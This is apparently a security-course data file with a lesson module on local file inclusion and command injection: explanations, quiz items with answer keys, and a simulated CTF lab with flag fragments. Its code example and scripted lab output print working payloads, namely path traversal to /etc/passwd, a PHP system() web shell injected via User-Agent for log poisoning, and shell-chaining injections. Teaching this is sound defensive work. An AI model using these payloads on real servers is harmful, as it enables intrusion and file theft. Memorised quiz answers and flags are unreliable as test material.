        "Local File Inclusion (LFI) and command injection are server-side injection flaws that turn a web request into actions on the server itself. LFI happens when an app includes a file path built from user input — `page=about` becomes `include('pages/'+$_GET['page'])` — letting an attacker traverse with `../../../../etc/passwd` to read arbitrary files, or, more dangerously, escalate to remote code execution by including a file they control (a poisoned log, an uploaded image, or PHP wrappers). Command injection is even more direct: when input is passed to a shell call like `system('ping '+$ip)`, appending `; id` or `&& cat /etc/passwd` runs attacker commands with the web server's privileges.",
        "The escalation from 'read a file' to 'run code' is the whole point. LFI to RCE via log poisoning works by injecting PHP into a User-Agent header that gets written to a log file, then including that log so the PHP executes. Command injection skips straight to a shell. Either way the result is code execution on the server — the foothold a red team is after. The fixes are unambiguous and OWASP-standard: never build file paths or shell commands from user input; use allow-lists of known-good values, avoid shell calls entirely (use safe library APIs and parameterized exec), and run the web process with least privilege so a popped shell is contained.",
      ],
      technical: {
        title: "LFI, RCE, and Command Injection",
        body: [
          "Local File Inclusion:\n- Path traversal: ?page=../../../../etc/passwd reads arbitrary files.\n- PHP wrappers: php://filter to read source, data:// or php://input to execute.\n- LFI → RCE via log poisoning: inject <?php system($_GET['c']); ?> into a User-Agent, then include the access log so it runs.",
          "Command injection:\n- An app runs system('ping -c1 '+$ip); input 8.8.8.8; id appends a second command.\n- Operators: ; (chain), && / || (conditional), | (pipe), `cmd` / $(cmd) (substitution).\n- Blind variants exfiltrate via DNS, time delays (sleep), or out-of-band callbacks.",
          "The fixes (OWASP Injection):\n- Never pass user input to include() or a shell — this is the root.\n- Allow-list expected values (a fixed set of page names); reject everything else.\n- Avoid shell calls; use safe APIs / parameterized exec; if unavoidable, escape rigorously.\n- Least-privilege web user + a read-only filesystem contain the blast radius.",
        ],
        codeExample: {
          label: "Path traversal → RCE; command injection",
          code: `# LFI — read arbitrary files
http://10.10.10.40/index.php?page=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash ...

# LFI -> RCE via log poisoning
User-Agent: <?php system($_GET['c']); ?>
http://10.10.10.40/index.php?page=/var/log/apache2/access.log&c=id
uid=33(www-data) gid=33(www-data)        # code execution!

# Command injection (ping tool)
ip=8.8.8.8; cat /etc/passwd
ip=8.8.8.8 && id

# THE FIX
# allow-list page names; never include() user input
# never system() user input — use safe library calls`,
        },
      },
      incident: {
        title: "Shellshock & Log4Shell — Injection to RCE at Scale",
        when: "2014 (Shellshock) · 2021 (Log4Shell)",
        where: "Bash-backed web servers (Shellshock); Java apps logging untrusted input (Log4Shell)",
        impact: "Internet-wide, pre-auth remote code execution from a single crafted input",
        body: [
          "Server-side injection to RCE is the most severe web outcome, and two events made it unforgettable. Shellshock (2014) let attackers run commands by stuffing them into HTTP headers that Bash evaluated. Log4Shell (2021) let a single logged string like ${jndi:ldap://...} trigger remote code execution in countless Java applications — CVSS 10.0, exploited within hours, and patched in a global scramble.",
          "Both are the same root cause as LFI and command injection: untrusted input reaching an interpreter (a shell, a logger, an include). The defenses are identical too — never let user input reach a command, an include path, or an evaluator; allow-list, use safe APIs, and run with least privilege. The 'read /etc/passwd' party trick and the internet-wide catastrophe are points on the same line.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "../../etc/passwd ; id", type: "attacker" },
          { label: "App include()/system()", sub: "user input → interpreter", type: "system" },
          { label: "File read → code exec", sub: "www-data shell", type: "victim" },
          { label: "Server compromise", sub: "→ fix: allow-list, no shell", type: "result" },
        ],
      },
      timeline: [
        { year: 2002, event: "PHP file-inclusion attacks documented" },
        { year: 2014, event: "Shellshock — HTTP header to Bash RCE", highlight: true },
        { year: 2021, event: "Log4Shell — one logged string to RCE (CVSS 10.0)" },
      ],
      keyTakeaways: [
        "LFI includes a user-controlled path: ../../etc/passwd reads files; log poisoning escalates to RCE",
        "Command injection passes input to a shell; ; && | $() chain attacker commands",
        "The goal is escalation from 'read a file' to 'run code' as the web user",
        "Shellshock and Log4Shell are the same root cause — untrusted input reaching an interpreter",
        "Fix (OWASP Injection): never feed input to include()/shell; allow-list, use safe APIs, least privilege",
      ],
      references: [
        { title: "OWASP — Command Injection", url: "https://owasp.org/www-community/attacks/Command_Injection" },
        { title: "OWASP — Path Traversal / LFI", url: "https://owasp.org/www-community/attacks/Path_Traversal" },
      ],
    },
    quiz: {
      questions: [
        { id: "web-04-q1", type: "LFI", challenge: "What it is.", text: "What is Local File Inclusion (LFI)?", options: ["Including a file path built from user input, allowing arbitrary file reads", "A password attack", "A DoS", "A TLS flaw"], correctIndex: 0, explanation: "LFI lets an attacker control which file the app includes/reads." },
        { id: "web-04-q2", type: "Traversal", challenge: "Read a file.", text: "What does ?page=../../../../etc/passwd exploit?", options: ["Path traversal to read files outside the intended directory", "A buffer overflow", "An XSS", "A CSRF"], correctIndex: 0, explanation: "../ sequences traverse up the filesystem to arbitrary files." },
        { id: "web-04-q3", type: "Escalation", challenge: "LFI → RCE.", text: "How does log poisoning turn LFI into RCE?", options: ["Inject PHP into a header that's logged, then include the log so it executes", "By cracking a hash", "Via DNS only", "It can't"], correctIndex: 0, explanation: "The included log file runs the injected PHP." },
        { id: "web-04-q4", type: "Cmd Injection", challenge: "Run commands.", text: "On a ping tool running system('ping '+$ip), what does ip=8.8.8.8; id do?", options: ["Runs id as a second command (command injection)", "Pings twice", "Encrypts output", "Nothing"], correctIndex: 0, explanation: "; chains an attacker command onto the shell call." },
        { id: "web-04-q5", type: "Operators", challenge: "Chaining.", text: "Which characters chain shell commands in an injection?", options: ["; && || | $() and backticks", "Only spaces", "Only +", "None"], correctIndex: 0, explanation: "These shell metacharacters combine or substitute commands." },
        { id: "web-04-q6", type: "Privilege", challenge: "Who you become.", text: "Code execution via a web app typically runs as which user?", options: ["The web server user (e.g. www-data) — then you escalate", "root immediately always", "Guest with no rights", "The DBA"], correctIndex: 0, explanation: "You get the web process's privileges, then pursue privesc." },
        { id: "web-04-q7", type: "Real World", challenge: "The catastrophe.", text: "What root cause do Shellshock and Log4Shell share with LFI/command injection?", options: ["Untrusted input reaching an interpreter (shell, logger, include)", "Weak TLS", "Brute force", "Phishing"], correctIndex: 0, explanation: "All are injection — input reaching an evaluator." },
        { id: "web-04-q8", type: "Fix", challenge: "The defense.", text: "What is the fix for LFI and command injection?", options: ["Never feed input to include()/shell; allow-list, use safe APIs, least privilege", "Hide the parameter", "Longer passwords", "Disable cookies"], correctIndex: 0, explanation: "Keep untrusted input away from interpreters; allow-list and constrain." },
      ],
    },
    ctf: {
      attackerMachine: kali,
      targetMachine: web("LFI + command injection (A03) — input reaches include() and a shell"),
      scenario: "The lab app's index.php?page= parameter includes files, and its network tool runs ping with your input. Prove the LFI by reading /etc/passwd, then escalate to remote code execution as www-data.",
      hint: "Traverse to read a system file, then escalate the inclusion (or the ping tool) to run a command.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Confirm LFI by reading a system file. Run: lfi-test http://10.10.10.40/index.php",
        "Escalate to remote code execution. Run: lfi-rce",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{LF1_", label: "LFI Briefing" },
        { trigger: "lfi-test http://10.10.10.40/index.php", value: "T0_RC3_", label: "File Read Confirmed" },
        { trigger: "lfi-rce", value: "PWN3D}", label: "Remote Code Execution" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — WEB LAB 4: LFI TO RCE",
          "Target http://10.10.10.40/index.php?page=  (+ a ping tool)",
          "Goal: read /etc/passwd via LFI, then escalate to RCE as www-data.",
          "Sequence: lfi-test http://10.10.10.40/index.php -> lfi-rce -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "lfi-test": (args: string[]) => {
          if (!String(args[0] || "").includes("10.10.10.40")) return { lines: ["Usage: lfi-test http://10.10.10.40/index.php"] };
          return {
            lines: [
              "GET /index.php?page=../../../../etc/passwd",
              "  root:x:0:0:root:/root:/bin/bash",
              "  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
              "  [+] arbitrary file read confirmed (path traversal in include())",
              "",
              ">> LEARN: the app did include('pages/'+page) with NO validation",
              "   ../ climbed out of pages/ to any file on disk.",
              "   Fragment collected.",
            ],
          };
        },
        "lfi-rce": (_args: string[]) => ({
          lines: [
            "Poisoning the access log with PHP, then including it:",
            "  User-Agent: <?php system($_GET['c']); ?>",
            "  GET /index.php?page=/var/log/apache2/access.log&c=id",
            "  uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- CODE EXECUTION",
            "  &c=cat+/var/www/flag.txt  ->  (flag retrieved)",
            "",
            ">> LEARN: LFI -> RCE via log poisoning — file read became code exec",
            ">> BLUE TEAM: allow-list page names; never include() input; least-priv www-data.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },
];
